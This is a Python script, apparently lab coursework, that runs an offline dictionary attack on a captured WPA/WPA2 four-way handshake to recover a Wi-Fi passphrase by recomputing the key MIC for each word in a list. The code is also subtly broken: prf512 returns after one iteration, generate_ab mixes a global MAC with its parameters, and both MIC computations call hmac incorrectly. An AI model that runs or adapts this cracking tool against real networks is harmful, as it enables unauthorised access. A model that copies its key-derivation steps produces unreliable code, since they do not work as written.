import hashlib
import hmac

from pbkdf2 import PBKDF2
from scapy.all import *
from subprocess import *
from scapy.layers.eap import EAPOL
from sceap_eap import *

cap = rdpcap("capture_wpa.pcap")
# Data recovery from wireshark capture
mac_station = cap[1].addr1.replace(':', '').decode("hex")
print("Mac station :", mac_station.encode("hex"))
mac_point_access = cap[1].addr2.replace(":", "").decode("hex")
print("Mac point access :", mac_point_access.encode("hex"))
nonce_station = cap[2][EAPOL].nonce.encode("hex")
print("Nonce station :", nonce_station)
nonce_point_access = cap[3][EAPOL].nonce.encode("hex")
print("Nonce point access:", nonce_point_access)
mic_cap = cap[4][EAPOL].wpa_key_mic
print("Mic capture:", mic_cap.encode("hex"))


# Function that calculates the PRF
def prf512(key, a, b):
    # Number of bytes in the PTK
    nb_octet = 64
    i = 0
    r = ''
    # Each iteration produces a 160-bit value, and 512 bits are required.
    while i <= ((nb_octet * 8 + 159) / 160):
        hmac_sha1 = hmac.new(key, a + chr(0x00).encode() + b + chr(i).encode(), hashlib.sha1)
        r = r + str(hmac_sha1.digest())
        i += 1

        return r[0:nb_octet]


# Set parameters for PTK generation
def generate_ab(gen_nonce_point_access, gen_nonce_station, gen_mac_point_access, gen_mac_station):
    a = b"Pairwise key expansion"
    b = min(gen_mac_station,
            gen_mac_point_access)+max(mac_station,
                                      gen_mac_point_access)+min(gen_nonce_station,
                                                                gen_nonce_point_access)+max(gen_nonce_station,
                                                                                            gen_nonce_point_access)
    return a, b


SSID = "M1WPA"
nonce_station = nonce_station.decode("hex")
nonce_point_access = nonce_point_access.decode("hex")
p = cap[4][EAPOL]
p.wpa_key_mic = ''

# The order of the aaaababa in the file for the speed of execution
with open('combinaisons.txt') as f:
    mot_de_passe = ''

    # Use MD5 if the capture is wpa-psk
    if cap[4][EAPOL].key_descriptor_Version == 1:
        print("Looking for the correct wpa-psk network password...")

        for line in f.readlines():
            supposed_pass = line.strip('\n')
            print(supposed_pass)

            try:
                # To generate a 32 byte value
                pmk = PBKDF2(supposed_pass.encode('ascii'),
                             SSID.encode(),
                             4096)
                PMK = pmk.read(32)

                # Generation parameters for PTK generation
                (A, B) = generate_ab(nonce_point_access,
                                     nonce_station,
                                     mac_point_access,
                                     mac_station)

                # Generation of the transient key by pair (PTK)
                PTK = prf512(PMK, A, B)

                # Generating the KCK from the PTK
                KCK = (PTK[0:16])

                # Generation of the MIC
                mic = hmac.new(bytes((KCK, str(p), hashlib.md5).digest())).encode("hex")
                if mic == mic_cap.encode("hex"):
                    mot_de_passe = supposed_pass
                    break

            except Exception as e:
                raise e

        # Use sha1 if wpa2-psk
    else:
        print("Looking for the correct wpa2-psk network password...")

        for line in f.readlines():
            supposed_pass = line.strip('\n')
            print(supposed_pass)

            try:
                # To generate a 32-byte value
                pmk = PBKDF2(supposed_pass.encode('ascii'),
                             SSID.encode(),
                             4096)
                PMK = pmk.read(32)

                # Generation parameters for PTK generation
                (A, B) = generate_ab(nonce_point_access,
                                     nonce_station,
                                     mac_point_access,
                                     mac_station)

                # Generation of the transient key by pair (PTK)
                PTK = prf512(PMK, A, B)

                # Generating the KCK from the PTK
                KCK = (PTK[0:16])

                # Generation of the MIC
                mic = hmac.new(bytes(KCK), hashlib.sha1).digest().encode("hex")

                if mic == mic_cap.encode("hex"):
                    mot_de_passe = supposed_pass
                    break

            except Exception as e:
                raise e

    if mot_de_passe != '':
        print("Password found: ", mot_de_passe)

    else:
        print("The password does not exist in the dictionary")
